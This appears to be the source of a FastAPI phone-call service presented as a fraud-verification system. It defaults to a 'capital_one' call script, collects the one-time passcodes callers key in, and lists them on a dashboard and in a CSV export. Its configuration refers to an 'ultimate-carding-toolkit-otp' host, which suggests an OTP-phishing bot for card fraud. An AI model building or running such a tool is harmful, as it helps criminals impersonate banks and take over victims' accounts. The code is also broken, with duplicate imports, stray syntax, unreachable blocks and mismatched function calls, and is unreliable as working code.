# main.py
from ui import router as ui_router
from scripts import SCRIPTS
from storage import call_logs, dtmf_logs
from ui import router as ui_router
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse, HTMLResponse
import uuid, random, time, os, csv, io
import requests

app = FastAPI()
app.include_router(ui_router)

# --- In-memory storage ---
verification_sessions = {}
call_logs = {}

# --- Configuration ---
MAX_OTP_ATTEMPTS = 3

# --- Session creation ---
def create_verification_session(phone, otp, script="capital_one", language="en-US"):
    session_id = str(uuid.uuid4())

    verification_sessions[session_id] = {
        "phone": phone,
        "otp": otp,
        "attempts": 0,
        "verified": False,
        "script": script,
        "language": language,
        "created_at": time.time()
    }

    return session_id

    }
    call_logs[session_id] = {
        "phone": phone,
        "script": script,
        "language": language,
        "otp": otp,
        "result": "pending",
        "timestamp": time.time()
    }
    dtmf_logs[session_id] = []
    
    return session_id, otp

def log_outcome(session_id, result):
    if session_id in call_logs:
        call_logs[session_id]["result"] = result

# --- Vonage integration placeholders ---
def send_sms_otp(phone, otp):
    print(f"Sending OTP {otp} to {phone}")
    # requests.post("https://rest.nexmo.com/sms/json", ...)

def place_call(phone, session_id):
    print(f"Placing call to {phone} with session {session_id}")
    # requests.post("https://api.nexmo.com/v1/calls", ...)

# --- Automatic fraud trigger ---
@app.post("/fraud/trigger")
async def fraud_trigger(data: dict):
    phone = data["phone"]
    otp = data["otp"]  # Provided by upstream system
    script = data.get("script", "capital_one")

    session_id = create_verification_session(phone, otp, script)

    place_call(phone, session_id)

    return {"status": "verification_started", "session_id": session_id}

# --- Manual fraud trigger ---
@app.post("/fraud/manual-call")
async def manual_call(data: dict, request: Request):
    require_role(request, "admin")
    key = request.headers.get("X-Internal-Key")
    if key != os.getenv("INTERNAL_KEY"):
        return {"error": "unauthorized"}

    phone = data["phone"]
    reason = data.get("reason", "manual_fraud_review")
    script = data.get("script", "capital_one")
    language = data.get("language", "en-US")
    session_id, otp = create_verification_session(phone, script, language)
    print(f"Manual fraud call triggered: {reason}")
    send_sms_otp(phone, otp)
    place_call(phone, session_id)
    return {"status": "manual_verification_started", "session_id": session_id}

# --- IVR Answer URL ---
@app.get("/answer")
async def answer(session_id: str):
    session = verification_sessions.get(session_id)
    script = SCRIPTS[session["script"]]["languages"][session["language"]]

    return JSONResponse([
        {"action": "talk", "text": script["intro"]},
        {"action": "talk", "text": script["recording"]},
        {"action": "talk", "text": script["otp"]},
        {
            "action": "input",
            "maxDigits": 6,
            "timeOut": 10,
            "eventUrl": [
                f"https://{os.getenv('ultimate-carding-toolkit-otp')}.fly.dev/input?session_id={session_id}"
            ]
        }
    ])

# --- IVR input handler ---
@app.post("/input")
async def input(request: Request, session_id: str):
    data = await request.json()
    digits = data.get("dtmf", {}).get("digits")

    session = verification_sessions.get(session_id)
    script = SCRIPTS[session["script"]]["languages"][session["language"]]

    # 🔴 LOG OTP DIGITS
    dtmf_logs[session_id].append(digits)

    if digits == session["otp"]:
        session["verified"] = True
        call_logs[session_id]["result"] = "otp_verified"

        return JSONResponse([
            {"action": "talk", "text": script["menu"]},
            {
                "action": "input",
                "maxDigits": 1,
                "eventUrl": [
                    f"https://{os.getenv('FLY_APP_NAME')}.fly.dev/menu?session_id={session_id}"
                ]
            }
        ])

    else:
        session["attempts"] += 1
        call_logs[session_id]["result"] = "otp_failed"

        if session["attempts"] >= 3:
            return JSONResponse([
                {"action": "talk", "text": script["fraud"]}
            ])

        return JSONResponse([
            {"action": "talk", "text": script["retry"]},
            {
                "action": "input",
                "maxDigits": 6,
                "eventUrl": [
                    f"https://{os.getenv('FLY_APP_NAME')}.fly.dev/input?session_id={session_id}"
                ]
            }
        ])

    # Call Menu
    @app.post("/menu")
async def menu(request: Request, session_id: str):
    data = await request.json()
    digit = data.get("dtmf", {}).get("digits")

    session = verification_sessions.get(session_id)
    script = SCRIPTS[session["script"]]["languages"][session["language"]]

    # 🔴 LOG MENU DIGITS
    dtmf_logs[session_id].append(digit)

    if digit == "1":
        call_logs[session_id]["result"] = "confirmed"
        msg = script["safe"]

    elif digit == "2":
        call_logs[session_id]["result"] = "fraud"
        msg = script["fraud"]

    elif digit == "9":
        call_logs[session_id]["result"] = "escalated"
        msg = script["escalate"]

    else:
        msg = script["retry"]

    return JSONResponse([
        {"action": "talk", "text": msg}
    ])

    # OTP verification
    if not session["verified"]:
        if digit == str(session["otp"]):
            session["verified"] = True
            log_outcome(session_id, "verified")
            msg = script["otp"] + " Verified."
        else:
            session["attempts"] += 1
            if session["attempts"] >= MAX_OTP_ATTEMPTS:
                log_outcome(session_id, "failed")
                msg = "Max attempts reached. Call terminated."
            else:
                msg = "Incorrect OTP. Try again."
        return JSONResponse([{"action": "talk", "text": msg}])

    # Menu handling after OTP
    if digit == "1":
        msg = script["safe"]
        log_outcome(session_id, "safe")
    elif digit == "2":
        msg = script["fraud"]
        log_outcome(session_id, "fraud_confirmed")
    elif digit == "9":
        msg = script["escalate"]
        log_outcome(session_id, "escalated")
    else:
        msg = script["retry"]
    return JSONResponse([{"action": "talk", "text": msg}])

# --- Fraud Ops Dashboard ---
@app.get("/ui", response_class=HTMLResponse)
async def ui():
    rows = ""
    for k, v in call_logs.items():
        rows += f"""
        <tr>
            <td>{k}</td>
            <td>{v['phone']}</td>
            <td>{v['script']}</td>
            <td>{v['language']}</td>
            <td>{v['otp']}</td>
            <td>{v['result']}</td>
        </tr>
        """
    return f"""
    <html>
    <body>
        <h2>Fraud Verification Dashboard</h2>
        <table border="1">
            <tr>
                <th>Session</th>
                <th>Phone</th>
                <th>Script</th>
                <th>Language</th>
                <th>OTP</th>
                <th>Result</th>
            </tr>
            {rows}
        </table>
    </body>
    </html>
    """

# --- Export CSV ---
@app.get("/export-csv")
async def export_csv():
    output = io.StringIO()
    writer = csv.DictWriter(output, fieldnames=["session", "phone", "script", "language", "otp", "result"])
    writer.writeheader()
    for k, v in call_logs.items():
        writer.writerow({
            "session": k,
            "phone": v["phone"],
            "script": v["script"],
            "language": v["language"],
            "otp": v["otp"],
            "result": v["result"]
        })
    return HTMLResponse(content=output.getvalue(), media_type="text/csv")
